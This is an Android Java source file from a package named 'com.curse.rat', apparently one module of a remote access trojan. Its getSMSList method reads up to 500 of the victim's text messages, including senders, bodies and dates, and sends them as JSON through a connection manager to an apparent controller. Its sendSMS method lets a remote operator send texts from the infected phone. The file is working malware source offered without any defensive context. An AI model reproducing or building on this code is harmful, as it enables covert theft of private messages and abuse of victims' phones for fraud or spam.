package com.curse.rat;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import org.json.JSONArray;
import org.json.JSONObject;

public class SMSManager {
    public static void getSMSList(Context context) {
        try {
            JSONArray list = new JSONArray();
            Uri uri = Uri.parse("content://sms/");
            Cursor cursor = context.getContentResolver().query(uri, null, null, null, "date DESC");
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 500) { // Limit to 500 for performance
                    JSONObject jo = new JSONObject();
                    jo.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    jo.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    jo.put("date", cursor.getLong(cursor.getColumnIndexOrThrow("date")));
                    jo.put("type", cursor.getInt(cursor.getColumnIndexOrThrow("type"))); // 1=Inbox, 2=Sent
                    list.put(jo);
                    count++;
                }
                cursor.close();
            }
            JSONObject res = new JSONObject();
            res.put("type", "sms");
            res.put("data", list);
            ConnectionManager.send(res.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void sendSMS(String number, String message) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(number, null, message, null, null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
